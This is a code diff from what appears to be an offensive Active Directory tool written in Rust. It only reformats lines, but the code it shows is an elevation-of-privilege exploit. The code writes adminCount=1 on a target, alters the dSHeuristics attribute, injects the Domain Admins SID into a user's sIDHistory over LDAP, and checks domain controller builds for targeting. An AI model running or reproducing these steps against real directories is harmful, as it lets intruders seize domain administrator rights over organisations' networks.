@@ -132,7 +132,10 @@ pub async fn exploit_ad_ds_eop(
         let full_target_dn = if target.contains("DC=") {
             target.to_string()
         } else {
-            format!("{target}{}", get_default_naming_context(ldap).await.unwrap_or_default())
+            format!(
+                "{target}{}",
+                get_default_naming_context(ldap).await.unwrap_or_default()
+            )
         };
         admin_count_target = Some(full_target_dn.clone());
         log.push(format!("Writing adminCount=1 on {full_target_dn}..."));
@@ -205,7 +208,10 @@ async fn read_dsheuristics(ldap: &mut LdapSession, ds_service_dn: &str) -> Resul
     Ok(None)
 }
 
-async fn set_dsheuristics_propagation(ldap: &mut LdapSession, ds_service_dn: &str) -> Result<String> {
+async fn set_dsheuristics_propagation(
+    ldap: &mut LdapSession,
+    ds_service_dn: &str,
+) -> Result<String> {
     let current = read_dsheuristics(ldap, ds_service_dn)
         .await?
         .unwrap_or_else(|| "000000000".to_string());
@@ -220,7 +226,8 @@ async fn set_dsheuristics_propagation(ldap: &mut LdapSession, ds_service_dn: &st
     }
 
     let new_value: String = chars.iter().collect();
-    ldap.modify_replace(ds_service_dn, "dSHeuristics", new_value.as_bytes()).await?;
+    ldap.modify_replace(ds_service_dn, "dSHeuristics", new_value.as_bytes())
+        .await?;
     Ok(new_value)
 }
 
@@ -282,9 +289,8 @@ async fn write_sid_history(
     user_dn: &str,
     sid: Option<String>,
 ) -> Result<()> {
-    let target_sid = sid.ok_or_else(|| {
-        OverthroneError::Adcs("Could not resolve Domain Admins SID".to_string())
-    })?;
+    let target_sid = sid
+        .ok_or_else(|| OverthroneError::Adcs("Could not resolve Domain Admins SID".to_string()))?;
     ldap.modify_add(user_dn, "sIDHistory", &[target_sid]).await
 }
 
@@ -306,8 +312,10 @@ async fn get_dc_build_number(ldap: &mut LdapSession) -> Option<String> {
 fn is_vulnerable_build(version: &Option<String>) -> bool {
     match version {
         Some(v) => {
-            if v.contains("10.0") || v.contains("Windows Server 2025")
-                || v.contains("Windows Server 2022") || v.contains("20348")
+            if v.contains("10.0")
+                || v.contains("Windows Server 2025")
+                || v.contains("Windows Server 2022")
+                || v.contains("20348")
             {
                 true
             } else {
@@ -340,7 +348,9 @@ mod tests {
     fn test_dsheuristics_modification() {
         let current = "000000000";
         let mut chars: Vec<char> = current.chars().collect();
-        while chars.len() < 10 { chars.push('0'); }
+        while chars.len() < 10 {
+            chars.push('0');
+        }
         if chars.len() > 7 && (chars[7] == '0' || chars[7] == ' ') {
             chars[7] = '1';
         }
@@ -352,7 +362,9 @@ mod tests {
     fn test_dsheuristics_already_set() {
         let current = "0000000100";
         let mut chars: Vec<char> = current.chars().collect();
-        while chars.len() < 10 { chars.push('0'); }
+        while chars.len() < 10 {
+            chars.push('0');
+        }
         if chars.len() > 7 && (chars[7] == '0' || chars[7] == ' ') {
             chars[7] = '1';
         }
